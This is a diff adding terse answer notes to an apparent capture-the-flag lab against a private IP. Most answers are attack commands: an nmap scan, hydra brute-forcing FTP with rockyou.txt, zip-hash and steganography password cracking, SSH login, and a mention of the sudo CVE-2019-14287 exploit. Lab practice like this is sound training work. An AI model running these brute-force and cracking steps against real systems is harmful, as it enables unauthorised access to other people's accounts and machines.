@@ -1,0 +1,31 @@
+Q1:
+    nmap -vv -Pn -sS -T4 -F 10.49.129.5
+Q2:
+    <by hint>
+Q3:
+    <by changing user-agent>
+Q4:
+    hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 4 10.49.129.5 ftp -I -V
+Q5:
+    binwalk cutie.png
+    binwalk -e cutie.png
+    zip2john 8702.zip > zip_hash.txt
+    john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt > zip_cracked.txt
+Q6:
+    awk "length(\$0) == 6" /usr/share/wordlists/rockyou.txt > len6wordlist.txt
+    stegcracker cute-alien.jpg len6wordlist.txt
+    steghide extract -sf cute-alien.jpg
+Q7:
+    <from message.txt>
+Q8:
+    <from message.txt>
+Q9:
+    ssh james@10.49.129.5
+Q10:
+    <reverse image search foxnews>
+Q11:
+    <search sudo v1.8.27 exploit on internet>
+Q12:
+    <run exploit CVE-2019-14287 on target machine>
+Q13:
+    <read root.txt>
